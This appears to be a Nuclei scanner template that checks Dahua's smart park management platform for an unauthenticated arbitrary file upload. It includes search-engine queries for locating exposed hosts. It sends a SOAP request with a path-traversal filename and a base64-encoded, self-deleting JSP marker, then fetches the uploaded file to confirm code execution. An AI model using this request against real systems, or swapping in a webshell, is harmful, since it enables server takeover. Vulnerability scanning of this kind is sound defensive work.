id: dahua-wpms-webservice-gis-soap-poi-fileupload
info:
  name: 大华智慧园区综合管理平台 /emap/webservice/gis/soap/poi - 路径存在任意文件上传漏洞
  author: leadlife
  severity: critical
  description: 大华智慧园区综合管理平台 /emap/webservice/gis/soap/poi接口处存在任意文件上传漏洞，未授权的攻击者可以上传后门文件，从而控制服务器权限。
  metadata:
    verified: true
    fofa-query: app="dahua-智慧园区综合管理平台"
    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
  tags: dahua,fileupload,wpms

variables: 
  random_str: "{{rand_base(6)}}"
  match_str: "{{md5(random_str)}}"

http:
  - raw:
      - |
        POST /emap/webservice/gis/soap/poi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 495

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/"> <soapenv:Header/> <soapenv:Body> <res:uploadPicFile> <!--type: string--> <arg0>/../../{{random_str}}.jsp</arg0> <!--type: base64Binary--> <arg1>PCUgb3V0LnByaW50bG4oImd0dHRzeHBtIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1> </res:uploadPicFile> </soapenv:Body> </soapenv:Envelope>
      
      - |
        GET /upload/{{random_str}}.jsp  HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'gtttsxpm')
        condition: and

